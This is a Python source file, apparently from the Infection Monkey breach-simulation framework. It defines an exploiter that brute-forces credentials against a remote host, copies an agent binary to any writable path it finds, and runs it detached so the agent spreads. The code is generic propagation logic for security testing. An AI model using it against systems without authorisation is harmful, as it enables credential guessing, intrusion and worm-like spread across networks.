import logging
from contextlib import suppress
from io import BytesIO
from pathlib import PurePath
from typing import Callable, Iterable

from common.credentials import Credentials
from common.types import Event
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.utils.threading import interruptible_iter

from . import (
    IRemoteAccessClient,
    IRemoteAccessClientFactory,
    RemoteAuthenticationError,
    RemoteFileCopyError,
)

logger = logging.getLogger(__name__)


class BruteForceExploiter:
    """
    An exploiter that brute-forces credentials and propagates the Monkey agent

    Operates on any exploit client that implements `IRemoteAccessClient`. An
    instance of `IRemoteAccessClientFactory` must be provided to create the
    exploit client.
    """

    def __init__(
        self,
        destination_path: PurePath,
        build_command: Callable[[PurePath, PurePath], str],
        exploit_client_factory: IRemoteAccessClientFactory,
        get_credentials: Callable[[], Iterable[Credentials]],
        agent_binary_repository: IAgentBinaryRepository,
    ):
        """
        :param destination_path: The destination path into which copy the agent
        :param build_command: A function that builds a command to propagate the Monkey agent
        :param exploit_client_factory: A factory that creates the exploit client
        :param get_credentials: A function that provides credentials for brute-forcing
        :param agent_binary_repository: A repository that provides the agent binary
        """
        self._destination_path = destination_path
        self._build_command = build_command
        self._exploit_client_factory = exploit_client_factory
        self._get_credentials = get_credentials
        self._agent_binary_repository = agent_binary_repository

    def exploit_host(
        self,
        host: TargetHost,
        interrupt: Event,
    ) -> ExploiterResultData:
        """
        Exploits the given host and propagates the Monkey agent

        :param host: The host to exploit
        :param interrupt: An event that can be set to interrupt the exploit
        :return: The result of the exploit
        """
        if interrupt.is_set():
            return ExploiterResultData()

        exploit_client = self._exploit_client_factory.create()

        try:
            self._exploit(exploit_client, interrupt)
        except Exception as err:
            logger.exception(f"Failed to exploit {host}: {err}")
            return ExploiterResultData(exploitation_success=False, propagation_success=False)

        try:
            self._propagate(exploit_client, host, interrupt)
            return ExploiterResultData(exploitation_success=True, propagation_success=True)
        except Exception as err:
            logger.exception(f"Failed to propagate to {host}: {err}")
            return ExploiterResultData(exploitation_success=True, propagation_success=False)

    def _exploit(self, exploit_client: IRemoteAccessClient, interrupt: Event):
        credential_combinations = self._get_credentials()

        for brute_force_credentials in interruptible_iter(credential_combinations, interrupt):
            try:
                exploit_client.login(brute_force_credentials)
                return
            except RemoteAuthenticationError:
                continue

        raise Exception("Failed to login with the given credentials")

    def _propagate(
        self,
        exploit_client: IRemoteAccessClient,
        host: TargetHost,
        interrupt: Event,
    ):
        target_host_os = exploit_client.get_os()
        agent_binary = self._agent_binary_repository.get_agent_binary(target_host_os)
        file_path = self._copy_file(agent_binary, self._destination_path, exploit_client, interrupt)

        command = self._build_command(file_path, self._destination_path)
        exploit_client.execute_detached(command)

    def _copy_file(
        self,
        file: BytesIO,
        destination: PurePath,
        exploit_client: IRemoteAccessClient,
        interrupt: Event,
    ) -> PurePath:
        file_data = file.getvalue()
        with suppress(RemoteFileCopyError):
            exploit_client.copy_file(file_data, destination)
            return destination

        other_destinations = exploit_client.get_writable_paths()
        for other_destination in interruptible_iter(other_destinations, interrupt):
            with suppress(RemoteFileCopyError):
                exploit_client.copy_file(file_data, other_destination)
                return other_destination

        raise Exception("Failed to copy file")
